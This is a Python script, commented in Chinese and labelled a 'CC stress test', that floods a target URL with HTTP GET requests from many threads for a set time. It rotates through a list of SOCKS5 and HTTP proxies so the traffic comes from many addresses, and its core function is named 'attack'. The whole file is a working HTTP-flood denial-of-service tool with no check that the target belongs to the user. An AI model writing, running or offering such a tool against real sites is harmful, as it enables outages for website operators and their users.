import argparse
import requests
import concurrent.futures
import time
import socket
import socks
from urllib.parse import urlparse

# 全局变量定义
PROXY_LIST = []
REQUEST_COUNTER = 0

def load_proxies(file_path):
    """加载并自动识别代理类型"""
    global PROXY_LIST
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                # 自动识别代理类型
                if line.startswith('socks5://'):
                    proxy_type = 'socks5'
                    proxy = line[9:]
                elif line.startswith('http://'):
                    proxy_type = 'http'
                    proxy = line[7:]
                else:  # 默认socks5
                    proxy_type = 'socks5'
                    proxy = line
                
                PROXY_LIST.append({
                    'type': proxy_type,
                    'addr': proxy,
                    'full': f"{proxy_type}://{proxy}"
                })
        return True
    except Exception as e:
        print(f"代理文件加载失败: {str(e)}")
        return False

def test_connection(target, proxy):
    """测试单个代理是否可用"""
    try:
        if proxy['type'] == 'socks5':
            socks.set_default_proxy(socks.SOCKS5, 
                                  proxy['addr'].split(':')[0],
                                  int(proxy['addr'].split(':')[1]))
            socket.socket = socks.socksocket
            
        response = requests.get(target, timeout=10, proxies={
            'http': proxy['full'],
            'https': proxy['full']
        } if proxy['type'] == 'http' else None)
        return True
    except:
        return False

def attack(target, duration):
    """执行压测的核心函数"""
    global REQUEST_COUNTER
    start_time = time.time()
    
    while time.time() - start_time < duration:
        try:
            # 随机选择代理
            current_proxy = PROXY_LIST[REQUEST_COUNTER % len(PROXY_LIST)] if PROXY_LIST else None
            
            # 使用代理发送请求
            if current_proxy and current_proxy['type'] == 'socks5':
                socks.set_default_proxy(socks.SOCKS5, 
                                      current_proxy['addr'].split(':')[0],
                                      int(current_proxy['addr'].split(':')[1]))
                socket.socket = socks.socksocket
                requests.get(target)
            elif current_proxy:
                requests.get(target, proxies={
                    'http': current_proxy['full'],
                    'https': current_proxy['full']
                })
            else:
                requests.get(target)
            
            REQUEST_COUNTER += 1
        except:
            continue

if __name__ == "__main__":
    # 参数解析
    parser = argparse.ArgumentParser(description='CC压力测试脚本')
    parser.add_argument('-u', '--url', required=True, help='目标URL')
    parser.add_argument('-t', '--threads', type=int, default=100, help='线程数')
    parser.add_argument('-d', '--duration', type=int, default=60, help='测试时长(秒)')
    parser.add_argument('-p', '--proxy', help='代理文件路径(.txt)')
    args = parser.parse_args()

    # 代理处理
    if args.proxy:
        if not load_proxies(args.proxy):
            print("使用直连模式")
    else:
        print("未提供代理文件，使用直连模式")

    print("等待中...")
    
    # 启动压力测试
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(attack, args.url, args.duration) 
                  for _ in range(args.threads)]
        
        # 等待所有线程完成
        concurrent.futures.wait(futures)
    
    print("完成!")
    print(f"总请求量: {REQUEST_COUNTER}")
    print("有效代理列表:")
    for idx, proxy in enumerate(PROXY_LIST):
        print(f"[{idx+1}] {proxy['type']}://{proxy['addr']}")
